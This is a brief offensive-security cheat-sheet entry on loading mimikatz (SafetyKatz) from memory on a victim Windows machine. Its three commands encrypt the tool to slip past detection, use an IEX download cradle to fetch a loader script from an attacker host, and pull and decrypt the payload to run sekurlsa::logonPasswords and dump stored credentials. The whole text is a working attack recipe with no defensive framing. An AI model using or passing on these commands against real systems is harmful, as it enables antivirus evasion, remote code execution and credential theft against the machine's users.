<h1>Loading mimikatz from memory</h1>


<h2><b>Run the following command on your local machine, in <u>pwsh</u> (powershell linux enviornment)</b></h2>

````bash
Invoke-SharpEncrypt -file C:\PathToFile\SafetyKatz.exe -password YourPassw0rd -outfile SafetyKatz.enc
````

<p>Once we hace our `.enc` file, we can upload the <b>Invoke-SharpLoader.ps1</b> to the victim machine</p>

````powershell
IEX (New-Object Net.WebClient).downloadString('http://attackerIP/Invoke-SharpLoader.ps1')
````

<p>Now, sharpLoader is on the victim machine, now we can decrypt the .enc file, from that way</p>

````powershell
Invoke-SharpLoader -location http://attackerIP/SafetyKatz.enc -password YourPassw0rd -argument privilege::debug -argument2 sekurlsa::logonPasswords
````
